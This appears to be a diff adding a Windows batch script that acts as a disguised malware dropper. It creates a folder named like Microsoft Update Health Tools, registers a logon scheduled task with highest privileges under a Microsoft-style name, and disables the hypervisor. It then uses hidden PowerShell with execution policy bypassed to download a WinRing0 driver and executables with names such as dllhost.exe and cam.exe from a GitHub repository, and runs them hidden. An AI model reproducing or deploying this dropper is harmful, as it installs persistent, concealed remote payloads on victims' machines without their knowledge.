@@ -1,0 +1,27 @@
+@echo off
+cd /d "%~dp0"
+set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"
+if not exist "%STAGE%" mkdir "%STAGE%"
+
+schtasks /query /tn "\Microsoft\Windows\UpdateHealthTools" >nul 2>&1 || schtasks /create /tn "\Microsoft\Windows\UpdateHealthTools" /tr "C:\Windows\System32\cmd.exe /c \"%STAGE%\main.cmd\"" /sc onlogon /rl highest /f >nul 2>&1
+
+bcdedit /set hypervisorlaunchtype off
+
+if not exist "%STAGE%\WinRing0x64.sys" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/WinRing0x64.sys' -OutFile '%STAGE%\WinRing0x64.sys' -UseBasicParsing"
+
+if not exist "%STAGE%\dllhost.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/dllhost.exe' -OutFile '%STAGE%\dllhost.exe' -UseBasicParsing"
+
+if not exist "%STAGE%\config.json" (
+  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/config.json' -OutFile '%STAGE%\config.json' -UseBasicParsing"
+   if not exist "%STAGE%\gen.ps1" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/gen.ps1' -OutFile '%STAGE%\gen.ps1' -UseBasicParsing"
+  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -File "%STAGE%\gen.ps1"
+)
+
+if not exist "%STAGE%\coreutils.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/coreutils.exe' -OutFile '%STAGE%\coreutils.exe' -UseBasicParsing"
+
+if not exist "%STAGE%\cam.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/cam.exe' -OutFile '%STAGE%\cam.exe' -UseBasicParsing"
+
+cd /d "%STAGE%"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\dllhost.exe' -WindowStyle Hidden"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\coreutils.exe' -WindowStyle Hidden"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\cam.exe' -WindowStyle Hidden"
